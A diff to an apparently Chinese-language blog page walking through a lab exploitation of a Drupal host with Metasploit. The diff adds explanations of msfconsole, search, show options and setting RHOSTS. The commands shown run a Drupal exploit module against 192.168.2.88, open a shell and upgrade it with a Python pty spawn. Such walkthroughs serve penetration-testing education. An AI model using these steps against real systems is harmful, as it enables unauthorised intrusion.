@@ -126,22 +126,26 @@
 <p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-12-29%20171645.png" alt="屏幕截图 2023-12-29 171645"></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure>
 
+<p>​		msfconsole命令是Metasploit框架的交互式控制台,用于管理和操作Metasploit中的各种模块,如exploit(利用模块)、payload(有效载荷)、encoder(编码器)等。</p>
 <p>打开msfconsole</p>
 <p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-12-29%20162658.png" alt="屏幕截图 2023-12-29 162658"></p>
 <p>每次显示的图都不一样。</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search drupal</span><br></pre></td></tr></table></figure>
 
+<p>msfconsole中的search命令可以搜索Metasploit框架中的所有模块。</p>
 <p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-12-29%20162724.png" alt="屏幕截图 2023-12-29 162724"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use 2</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use 2 # 用第二个</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-12-29%20162806.png" alt="屏幕截图 2023-12-29 162806"></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show options</span><br></pre></td></tr></table></figure>
 
+<p>在msfconsole中,show命令可以查看模块的各种参数(options)设置。</p>
 <p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-12-29%20163526.png" alt="屏幕截图 2023-12-29 163526"></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set rhosts 192.168.2.88</span><br></pre></td></tr></table></figure>
 
+<p>设置exploit模块的RHOSTS参数,用于指定要攻击的目标主机IP地址。</p>
 <p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-12-29%20162901.png" alt="屏幕截图 2023-12-29 162901"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run # 运行</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-12-29%20163111.png" alt="屏幕截图 2023-12-29 163111"></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br><span class="line">python -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></pre></td></tr></table></figure>
